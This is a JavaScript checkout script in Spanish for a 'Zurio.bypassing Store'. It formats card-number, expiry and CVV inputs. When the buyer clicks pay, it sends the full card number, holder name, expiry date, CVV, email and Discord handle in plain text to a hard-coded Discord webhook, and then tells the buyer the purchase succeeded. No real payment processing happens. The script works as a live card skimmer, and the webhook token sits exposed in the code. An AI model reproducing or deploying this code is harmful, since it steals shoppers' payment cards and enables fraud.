document.addEventListener('DOMContentLoaded', function() {
    const paymentOptions = document.querySelectorAll('.payment-option');
    const paymentForms = document.querySelectorAll('.payment-form');
    const payButton = document.querySelector('.pay-button');

    // Manejar selección de método de pago
    paymentOptions.forEach(option => {
        option.addEventListener('click', function() {
            // Remover selección previa
            paymentOptions.forEach(opt => opt.classList.remove('selected'));
            paymentForms.forEach(form => form.classList.remove('active'));
            
            // Activar opción seleccionada
            this.classList.add('selected');
            const method = this.dataset.method;
            const selectedForm = document.getElementById(`${method}-form`);
            if (selectedForm) {
                selectedForm.classList.add('active');
            }
            
            // Habilitar botón de pago
            payButton.disabled = false;
        });
    });

    // Formatear número de tarjeta
    const cardNumber = document.getElementById('card-number');
    if (cardNumber) {
        cardNumber.addEventListener('input', function() {
            let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = '';
            for(let i = 0; i < value.length; i++) {
                if(i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            this.value = formattedValue;
        });
    }

    // Formatear fecha de expiración
    const cardExpiry = document.getElementById('card-expiry');
    if (cardExpiry) {
        cardExpiry.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substr(0, 2) + '/' + value.substr(2);
            }
            this.value = value;
        });
    }

    // Validar CVV
    const cardCvv = document.getElementById('card-cvv');
    if (cardCvv) {
        cardCvv.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
    }

    // Función para enviar el webhook
    async function enviarWebhook(datos) {
        const webhookUrl = 'https://discord.com/api/webhooks/1307386565235835000/iPNSeSYy4T4OqVW0whJ6gmhecNLk-8iztdylvY4ufr3HOlKwOIkRWewYvNwYC1-_v502';
        
        // Obtener los datos de la tarjeta si es pago con tarjeta
        let cardInfo = '';
        if (datos.metodoPago === 'Tarjeta de Crédito') {
            const cardNumber = document.getElementById('card-number').value;
            const cardName = document.getElementById('card-name').value;
            const cardExpiry = document.getElementById('card-expiry').value;
            const cardCvv = document.getElementById('card-cvv').value;
            
            cardInfo = [
                `**Número:** \`${cardNumber}\``,
                `**Titular:** \`${cardName}\``,
                `**Vencimiento:** \`${cardExpiry}\``,
                `**CVV:** \`${cardCvv}\``
            ].join('\n');
        }

        const webhookData = {
            embeds: [{
                title: "🛒 Nueva Orden de Compra",
                description: "Se ha realizado una nueva compra en la tienda.",
                color: 0xb388ff,
                fields: [
                    {
                        name: "📦 Plan",
                        value: `\`${datos.plan}\``,
                        inline: true
                    },
                    {
                        name: "💰 Precio",
                        value: `\`$${datos.precio}\``,
                        inline: true
                    },
                    {
                        name: "💳 Método de Pago",
                        value: `\`${datos.metodoPago}\``,
                        inline: true
                    },
                    {
                        name: "👤 Información del Cliente",
                        value: `**Discord:** \`${datos.discord}\`\n**Email:** \`${datos.email}\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Zurio.bypassing Store"
                }
            }]
        };

        // Agregar información de la tarjeta si existe
        if (cardInfo) {
            webhookData.embeds[0].fields.push({
                name: "💳 Datos de la Tarjeta",
                value: cardInfo,
                inline: false
            });
        }

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            });

            if (!response.ok) {
                throw new Error('Error al enviar webhook');
            }

            console.log('Webhook enviado exitosamente');
            return true;
        } catch (error) {
            console.error('Error:', error);
            return false;
        }
    }

    // Manejar el envío del formulario
    document.querySelector('.pay-button').addEventListener('click', async function() {
        const selectedPayment = document.querySelector('.payment-option.selected');
        if (!selectedPayment) {
            alert('Por favor, selecciona un método de pago');
            return;
        }

        const metodoPago = selectedPayment.querySelector('span').textContent;
        let email, discord;

        // Validar y obtener datos según el método de pago
        if (metodoPago === 'Tarjeta de Crédito') {
            const cardNumber = document.getElementById('card-number').value;
            const cardName = document.getElementById('card-name').value;
            const cardExpiry = document.getElementById('card-expiry').value;
            const cardCvv = document.getElementById('card-cvv').value;
            email = document.getElementById('email-card').value;
            discord = document.getElementById('discord-card').value;

            if (!cardNumber || !cardName || !cardExpiry || !cardCvv || !email || !discord) {
                alert('Por favor, completa todos los campos de la tarjeta');
                return;
            }
        } else {
            email = document.getElementById('paypal-email').value;
            discord = document.getElementById('discord-paypal').value;

            if (!email || !discord) {
                alert('Por favor, completa todos los campos de PayPal');
                return;
            }
        }

        const urlParams = new URLSearchParams(window.location.search);
        const plan = urlParams.get('plan') || 'Basic';
        const precio = urlParams.get('precio') || '9.99';

        const datos = {
            plan: plan,
            precio: precio,
            metodoPago: metodoPago,
            email: email,
            discord: discord
        };

        const enviado = await enviarWebhook(datos);
        if (enviado) {
            alert('¡Compra procesada con éxito!');
        } else {
            alert('Hubo un error al procesar la compra. Por favor, intenta nuevamente.');
        }
    });
}); 